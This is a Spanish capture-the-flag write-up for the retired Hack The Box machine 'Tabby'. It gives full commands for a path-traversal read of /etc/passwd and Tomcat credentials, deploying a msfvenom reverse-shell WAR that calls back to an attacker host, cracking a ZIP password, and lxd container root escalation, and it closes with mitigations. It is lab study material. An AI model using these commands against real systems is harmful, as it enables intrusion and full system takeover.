---
machine: Tabby
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / Linux
state: Retired
tags: [linux, tomcat, lfi, war-deploy, fcrackzip, password-reuse, lxd]
---

# Tabby — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

Un **LFI** en `news.php` deja leer `/etc/passwd` y el `tomcat-users.xml`, de donde salen credenciales de Tomcat con rol `manager-script`. Aunque `/manager/html` está restringido a localhost, `/manager/text/deploy` acepta un WAR por `PUT` → shell como `tomcat`. Un backup ZIP propiedad de `ash` se crackea con `fcrackzip`; esa misma contraseña sirve para `su ash`. `ash` está en el grupo **`lxd`**: un contenedor privilegiado con `/` montado da root.

## Reconocimiento

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp   open  http    nginx 1.18.0  → "Mega Hosting"
8080/tcp open  http    Apache Tomcat 9.0.31
```

```bash
ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404
```

El sitio se sirve como vhost `megahosting.htb`; conviene añadirlo a `/etc/hosts` para que el 8080 resuelva bien.

```bash
echo "<IP> tabby.htb megahosting.htb" | sudo tee -a /etc/hosts
```

## Acceso

1. **LFI** en la sección de noticias:

```bash
curl 'http://megahosting.htb/news.php?file=../../../../etc/passwd'
curl 'http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml'
```

```xml
<user username="tomcat" password="<password>" roles="tomcat,admin-gui,manager-script"/>
```

2. **Despliegue de un WAR**: `/manager/html` responde 403 desde fuera (sólo localhost), pero el endpoint de texto sí funciona con `manager-script`.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war -o shell.war
curl -X PUT -u tomcat:<password> \
  -T shell.war "http://tabby.htb:8080/manager/text/deploy?path=/shell&update=true"
```

```bash
curl http://tabby.htb:8080/shell/
```

```text
tomcat@tabby:/$
```

3. **Backup de `ash`**: `linpeas` señala un ZIP en el webroot.

```bash
ls -lhA /var/www/html/files
fcrackzip -D -p /usr/share/wordlists/rockyou.txt /var/www/html/files/16162020_backup.zip
unzip 16162020_backup.zip -d /tmp/backup
```

La contraseña del ZIP es también la de la cuenta `ash`:

```bash
su ash
```

## Escalada

```bash
id
# uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

Estar en `lxd` equivale a root: se importa una imagen y se arranca un contenedor **privilegiado** con el `/` del host montado.

```bash
# fuera: construir imagen alpine
sudo distrobuilder build-lxd alpine.yaml     # lxd.tar.xz + rootfs.squashfs
python3 -m http.server 8888

# en la víctima
wget http://<IP>:8888/lxd.tar.xz
wget http://<IP>:8888/rootfs.squashfs
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
```

```text
# cat /mnt/root/root/root.txt
```

## Tropiezos

- **403 en `/manager/html`**: no es un callejón; `/manager/text/deploy` sólo exige el rol `manager-script`.
- **`file=` relativo**: hay que subir suficientes niveles para salir del webroot.
- **Vhost**: sin `megahosting.htb` en `/etc/hosts`, el 80 sirve una página distinta y el LFI parece roto.
- **`lxc` vs `lxd`**: hace falta una imagen importada; sin ella `lxc init` falla. El contenedor debe ser privilegiado y con el disco del host montado.

## Lecciones

- Un LFI que alcanza `tomcat-users.xml` convierte un servicio interno en RCE por despliegue de WAR.
- La reutilización de contraseñas ZIP → sistema es habitual; el backup estaba en el propio webroot.
- Pertenecer a `lxd`/`docker` es root de facto: el grupo permite montar el sistema de ficheros del host.
- Mitigación: parchear el LFI, rotar credenciales de Tomcat, sacar backups del webroot y eliminar a los usuarios de los grupos de contenedores.
